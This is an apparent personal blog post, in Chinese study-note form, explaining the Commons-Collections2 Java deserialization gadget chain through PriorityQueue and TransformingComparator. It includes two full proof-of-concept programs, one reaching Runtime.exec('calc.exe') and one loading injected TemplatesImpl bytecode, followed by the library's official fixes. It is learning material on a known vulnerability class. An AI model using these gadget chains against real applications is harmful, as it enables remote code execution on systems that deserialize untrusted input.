{"title":"Java反序列化6笔记","uid":"4a2c67097cc575b58a19c08f5d864189","slug":"Java反序列化6笔记","date":"2022-09-16T11:41:20.000Z","updated":"2022-09-16T12:05:26.316Z","comments":true,"path":"api/articles/Java反序列化6笔记.json","keywords":null,"cover":[],"content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h1 id=\"参考资料：\"><a href=\"#参考资料：\" class=\"headerlink\" title=\"参考资料：\"></a>参考资料：</h1><p>p牛 Java安全漫谈16 </p>\n<p><a href=\"https://t.zsxq.com/06JeeqbMN\">https://t.zsxq.com/06JeeqbMN</a></p>\n<p>Java Things</p>\n<p><a href=\"https://github.com/phith0n/JavaThings\">https://github.com/phith0n/JavaThings</a></p>\n<p>PriorityQueue源码分析</p>\n<p><a href=\"https://www.cnblogs.com/linghu-java/p/9467805.html\">https://www.cnblogs.com/linghu-java/p/9467805.html</a></p>\n<h1 id=\"Commons-Collections4：\"><a href=\"#Commons-Collections4：\" class=\"headerlink\" title=\"Commons-Collections4：\"></a>Commons-Collections4：</h1><p>官方认为以前的 commons-collections 设计的有问题，所以官方重做了，就出现了org.apache.commons:Commons-Collections4，而且重做后在同一个项目可以同时存在老的Commons-Collections和新的Commons-Collections4。</p>\n<p>在将以前的CC链的Commons-Collections替换成Commons-Collections4后执行会报错，官方去除了LazyMap.decorate方法，改了个名字换成了LazyMap.lazyMap方法，当然还有其他的类的decorate方法，都是改了个名字，将方法名替换后就可以成功执行。</p>\n<p>Commons-Collections版：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"> public static Map decorate(Map map, Transformer factory) &#123; \n\nreturn new LazyMap(map, factory); \n\n&#125;  </code></pre>\n\n<p>Commons-Collections4版：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"> public static  LazyMap lazyMap(final Map map, final Transformer factory) &#123; \n\nreturn new LazyMap(map, factory);\n\n &#125; </code></pre>\n\n\n\n<h1 id=\"Commons-Collections2：\"><a href=\"#Commons-Collections2：\" class=\"headerlink\" title=\"Commons Collections2：\"></a>Commons Collections2：</h1><p>在替换为Commons-Collections4后，又新增了几条利用链，比如现在学习的Commons-Collections2利用链</p>\n<h2 id=\"Commons-Collections经常使用的原因，原文：\"><a href=\"#Commons-Collections经常使用的原因，原文：\" class=\"headerlink\" title=\"Commons-Collections经常使用的原因，原文：\"></a>Commons-Collections经常使用的原因，原文：</h2><p>commons-collections这个包之所有能攒出那么多利用链来，除了因为其使用量大，技术上的原因是其 中包含了⼀些可以执行任意方法的<strong>Transformer</strong>。所以<strong>，在commons-collections中找Gadget的过程，实际上可以简化为，找⼀条从 Serializable#readObject() 方法到 Transformer#transform() 方法的调用链。</strong>  </p>\n<h2 id=\"PriorityQueue-：\"><a href=\"#PriorityQueue-：\" class=\"headerlink\" title=\"PriorityQueue ：\"></a>PriorityQueue ：</h2><p>CC2使用了新的链路，通过java.util.PriorityQueue类，和 org.apache.commons.collections4.comparators.TransformingComparator类</p>\n<p>其中PriorityQueue的readObject方法中，会调用heapify方法</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/10.PNG\"></p>\n<p>heapify方法或调用siftDown方法</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/11.PNG\"></p>\n<p>siftDown方法则会进行判断，如果comparator存在则会调用siftDownUsingComparator方法</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/12.PNG\"></p>\n<p>siftDownUsingComparator顾名思义就是用comparator进行比较，它会调用comparator的compare方法</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/13.PNG\"></p>\n<p>而TransformingComparator中含有compare方法，并且会触发transform</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/14.PNG\"></p>\n<p>这样利用链就清楚了，只需实例化一个TransformingComparator对象包裹前面的transformerChain让其作为comparator，之后实例化PriorityQueue对象，将comparator传入，同时随意添加两个非null参数，两个才能触发比较</p>\n<p>这样在比较前面，对会通过TransformingComparator.compare触发回调</p>\n<p>调式的时候发现会触发两次</p>\n<h3 id=\"完整代码：\"><a href=\"#完整代码：\" class=\"headerlink\" title=\"完整代码：\"></a>完整代码：</h3><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">package com.CommonCollections4Test;\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.Comparator;\nimport java.util.PriorityQueue;\nimport org.apache.commons.collections4.Transformer;\nimport org.apache.commons.collections4.functors.ChainedTransformer;\nimport org.apache.commons.collections4.functors.ConstantTransformer;\nimport org.apache.commons.collections4.functors.InvokerTransformer;\nimport org.apache.commons.collections4.comparators.TransformingComparator;\n\npublic class CommonsCollections2 &#123;\n\tpublic static void setFieldValue(Object obj, String fieldName, Object\n\t\t\tvalue) throws Exception &#123;\n\t\t\t Field field &#x3D; obj.getClass().getDeclaredField(fieldName);\n\t\t\t field.setAccessible(true);\n\t\t\t field.set(obj, value);\n\t&#125;\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\t&#x2F;&#x2F;正常流程\n\t\tTransformer[] fakeTransformers &#x3D; new Transformer[] &#123;new\n\t\t\tConstantTransformer(1)&#125;;\n\t\tTransformer[] transformers &#x3D; new Transformer[] &#123;\n\t\t\tnew ConstantTransformer(Runtime.class),\n\t\t\tnew InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,\n\t\t\t Class[].class &#125;, \n\t\t\tnew Object[] &#123; &quot;getRuntime&quot;,new Class[0] &#125;),\n\t\t\tnew InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,\n\t\t\t\t\tObject[].class &#125;, \n\t\t\tnew Object[] &#123; null, new Object[0] &#125;),\n\t\t\tnew InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;,\n\t\t\tnew String[] &#123; &quot;calc.exe&quot; &#125;),\n\t\t&#125;;\n\t\tTransformer transformerChain &#x3D; new ChainedTransformer(fakeTransformers);\n\t\t&#x2F;&#x2F;实例化一个TransformingComparator用来包裹\n\t\tComparator comparator &#x3D; new TransformingComparator(transformerChain);\n\t\t&#x2F;&#x2F;使用PriorityQueue触发排序，最少两个数，传入设计好的比较器\n\t\tPriorityQueue queue &#x3D; new PriorityQueue(2, comparator);\n\t\t&#x2F;&#x2F;可传入任意非null参数，transformer忽略传入参数\n\t\tqueue.add(1);\n\t\tqueue.add(2);\n\t\t&#x2F;&#x2F;换成恶意transformer\n\t\tsetFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);\n\t\t&#x2F;&#x2F;序列化\n\t\tByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n\t\tObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n\t\toos.writeObject(queue);\n\t\toos.close();\n\t\t&#x2F;&#x2F;反序列化\n\t\tSystem.out.println(barr);\n\t\tObjectInputStream ois &#x3D; new ObjectInputStream(new\n\t\tByteArrayInputStream(barr.toByteArray()));\n\t\tObject o &#x3D; (Object)ois.readObject();\n\t\n\t&#125;\n\n&#125;\n\n</code></pre>\n\n\n\n<h2 id=\"CC2TemplatesImpl：\"><a href=\"#CC2TemplatesImpl：\" class=\"headerlink\" title=\"CC2TemplatesImpl：\"></a>CC2TemplatesImpl：</h2><p>同样可以使用TemplatesImpl</p>\n<p>还是一样下先传入非恶意的InvokerTransformer，用它实例化comparator，同时传入比较的参数为实例化的TemplatesImpl，之后在修改InvokerTransformer为恶意的newTransformer</p>\n<p>通过comparator将TemplatesImpl传递到transform，再传给newTransfoemer</p>\n<p>完整代码：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">package com.CommonCollections4Test;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport org.apache.commons.collections4.Transformer;\nimport org.apache.commons.collections4.comparators.TransformingComparator;\nimport org.apache.commons.collections4.functors.InvokerTransformer;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.Comparator;\nimport java.util.PriorityQueue;\n\npublic class CommonsCollections2TemplatesImpl &#123;\n\tpublic static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;\n        Field field &#x3D; obj.getClass().getDeclaredField(fieldName);\n        field.setAccessible(true);\n        field.set(obj, value);\n    &#125;\n\t&#x2F;&#x2F;获取恶意class\n    protected static byte[] getBytescode() throws Exception &#123;\n        ClassPool pool &#x3D; ClassPool.getDefault();\n        CtClass clazz &#x3D; pool.get(com.shiroattack.Evil.class.getName());\n        return clazz.toBytecode();\n    &#125;\n\n    public static void main(String[] args) throws Exception &#123;\n        TemplatesImpl obj &#x3D; new TemplatesImpl();\n        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;getBytescode()&#125;);\n        setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);\n        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());\n\n        Transformer transformer &#x3D; new InvokerTransformer(&quot;toString&quot;, null, null);\n        Comparator comparator &#x3D; new TransformingComparator(transformer);\n        PriorityQueue queue &#x3D; new PriorityQueue(2, comparator);\n        queue.add(obj);\n        queue.add(obj);\n\n        setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);\n\n        ByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n        ObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n        oos.writeObject(queue);\n        oos.close();\n\n&#x2F;&#x2F;        System.out.println(barr);\n        ObjectInputStream ois &#x3D; new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));\n        Object o &#x3D; (Object)ois.readObject();\n    &#125;\n\n&#125;\n</code></pre>\n\n\n\n<h2 id=\"commons-collections-的官方修复\"><a href=\"#commons-collections-的官方修复\" class=\"headerlink\" title=\"commons-collections 的官方修复\"></a>commons-collections 的官方修复</h2><h3 id=\"commons-collections3-2-2：\"><a href=\"#commons-collections3-2-2：\" class=\"headerlink\" title=\"commons-collections3.2.2：\"></a>commons-collections3.2.2：</h3><p>如果没有设置 org.apache.commons.collections.enableUnsafeSerialization=true ，那么将不会允许一些Transforme类的readObject的调用</p>\n<h3 id=\"commons-collections4-1\"><a href=\"#commons-collections4-1\" class=\"headerlink\" title=\"commons-collections4.1\"></a>commons-collections4.1</h3><p>这个修复更加简单粗暴，直接不实现Serializable接口，这样就无法序列化和反序列化</p>\n","text":" 参考资料：p牛 Java安全漫谈16 https://t.zsxq.com/06JeeqbMN Java Things https://github.com/phith0n/JavaThings PriorityQueue源码分析 https://www.cnblogs.com...","link":"","photos":[],"count_time":{"symbolsCount":"7.1k","symbolsTime":"6 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":11,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java","slug":"Java","count":15,"path":"api/tags/Java.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99%EF%BC%9A\"><span class=\"toc-text\">参考资料：</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Commons-Collections4%EF%BC%9A\"><span class=\"toc-text\">Commons-Collections4：</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Commons-Collections2%EF%BC%9A\"><span class=\"toc-text\">Commons Collections2：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Commons-Collections%E7%BB%8F%E5%B8%B8%E4%BD%BF%E7%94%A8%E7%9A%84%E5%8E%9F%E5%9B%A0%EF%BC%8C%E5%8E%9F%E6%96%87%EF%BC%9A\"><span class=\"toc-text\">Commons-Collections经常使用的原因，原文：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#PriorityQueue-%EF%BC%9A\"><span class=\"toc-text\">PriorityQueue ：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81%EF%BC%9A\"><span class=\"toc-text\">完整代码：</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CC2TemplatesImpl%EF%BC%9A\"><span class=\"toc-text\">CC2TemplatesImpl：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#commons-collections-%E7%9A%84%E5%AE%98%E6%96%B9%E4%BF%AE%E5%A4%8D\"><span class=\"toc-text\">commons-collections 的官方修复</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#commons-collections3-2-2%EF%BC%9A\"><span class=\"toc-text\">commons-collections3.2.2：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#commons-collections4-1\"><span class=\"toc-text\">commons-collections4.1</span></a></li></ol></li></ol></li></ol>","author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Java反序列化7笔记","uid":"12aa89fe66392175592eb0eacb1d89b4","slug":"Java反序列化7笔记","date":"2022-09-16T11:41:44.000Z","updated":"2022-09-16T12:15:51.820Z","comments":true,"path":"api/articles/Java反序列化7笔记.json","keywords":null,"cover":[],"text":" 参考资料：p牛 Java安全漫谈17 https://t.zsxq.com/067qjIa6Y 廖雪峰老师的JavaBean教程： https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680 Common...","link":"","photos":[],"count_time":{"symbolsCount":"9.2k","symbolsTime":"8 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":11,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java","slug":"Java","count":15,"path":"api/tags/Java.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Java反序列化5笔记","uid":"98f7491bb751eb8b6537f6ad2a4d2b25","slug":"Java反序列化5笔记","date":"2022-09-13T14:10:58.000Z","updated":"2022-09-13T14:29:35.662Z","comments":true,"path":"api/articles/Java反序列化5笔记.json","keywords":null,"cover":[],"text":" 参考资料：p牛 Java安全漫谈 15 https://t.zsxq.com/06NneiyFI Java Things https://github.com/phith0n/JavaThings Orange blog文章： http://blog.orange.tw/201...","link":"","photos":[],"count_time":{"symbolsCount":"8.4k","symbolsTime":"8 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":11,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java","slug":"Java","count":15,"path":"api/tags/Java.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}